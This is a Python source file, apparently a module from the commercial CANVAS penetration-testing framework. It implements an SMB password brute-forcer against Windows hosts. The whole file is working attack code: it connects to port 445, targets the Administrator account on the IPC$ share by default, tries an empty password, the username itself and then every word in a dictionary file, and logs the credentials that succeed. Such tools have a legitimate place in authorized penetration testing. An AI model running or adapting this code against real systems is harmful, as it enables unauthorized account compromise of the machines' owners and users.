#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from libs.newsmb.libsmb import SMBClient, SMBClientException

NAME                           = 'SMB bruteforcer'
DESCRIPTION                    = '(Not so) slow SMB bruteforcer'
DOCUMENTATION                  = {}
DOCUMENTATION['Date public']   = '10/21/04'
DOCUMENTATION['References']    = ''
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['Notes']         = 'This just does a brute force against a username using a dictionary'

VERSION             = '0.1'
PROPERTY            = {}
PROPERTY['TYPE']    = 'Tools'
PROPERTY['SITE']    = 'Remote'
PROPERTY['ARCH']    = [['Windows']]
PROPERTY['VERSION'] = ['NT','2000','XP','2003']
NOTES               = """ 
"""
CHANGELOG           = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.name     = NAME
        self.port     = 445
        self.filename = '/usr/share/dict/words'
        self.share    = u'IPC$'
        self.username = u'Administrator'


    def getArgs(self):
        self.host     = self.target.interface
        self.username = self.argsDict.get('username', self.username)
        self.filename = self.argsDict.get('filename', self.filename)
        self.share    = self.argsDict.get('share', self.share)
        self.port     = self.argsDict.get('port', self.port)


    def getsocket(self):
        if ':' in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()
        
    def test(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d' % (NAME, self.host, self.port, self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running' % (NAME, self.host, self.port, self.covertness))

        sockaddr = (self.host, self.port)
        s = self.getsocket()
        
        try:
            s.connect(sockaddr)
        except:
            self.log('Could not connect to remote host')
            return 0

        try:
            smbobj = SMBClient(s, username=self.username)
            smbobj.negotiate()
        except SMBClientException, ex:
            self.log('Could not negotiate with SMB server: %s' % ex)
            return 0

        try:
            smbobj.session_setup()
            smbobj.tree_connect(self.share)
        except SMBClientException:
            self.log(u'SMB tree connect failed for %s' % self.username)
            return 0

        self.log(u'Connected to share %s' % (self.share))
        try:
            smbobj.logoff()
        except SMBClientException:
            pass

        self.log('SMB connected to %s:%d' % sockaddr)
        return 1
    
    def run(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d' % (NAME, self.host, self.port, self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running' % (NAME, self.host, self.port, self.covertness))

        self.log('Share is: %s' % self.share)
        
        try:
            passwords = file(self.filename).readlines()
        except:
            self.log('Failed to open password file %s' % (self.filename))
            return 0

        passwords.insert(0, self.username)
        passwords.insert(0, u'')
        sockaddr = (self.host, self.port)

        try:
            s = self.getsocket()
            s.connect(sockaddr)
            smbobj = SMBClient(s, username=self.username)
            smbobj.negotiate()
        except SMBClientException, ex:
            self.log('Failed to negotiate: %s' % ex)
            return 0
        except:
            self.log('Failed to connect to %s:%d' % sockaddr)
            return 0
        
        for password in passwords:
            if self.state == self.HALT:
                self.log('Halted')
                return 0

            password = password.strip()
            # For now canvas is unable to handle complex unicode.
            try:
                password = unicode(password)
            except UnicodeDecodeError:
                continue
            
            try:
                smbobj.session_setup(password=password)
                smbobj.tree_connect(self.share)
            except SMBClientException:
                self.log(u'Attempt failed for %s:%s' % (self.username, password))
                continue
            
            self.log(u'Connected to share %s with %s:%s' % (self.share, self.username, password))
            self.log('Done with exploit')
            self.setInfo('%s attacking %s:%d (Covertness:%d) - done (found:%s:%s)'%(NAME, self.host, self.port,
                                                                                    self.covertness, self.username, password))
            return 1
        
        self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)' % (NAME, self.host, self.port, self.covertness))
        return 0        


if __name__=='__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
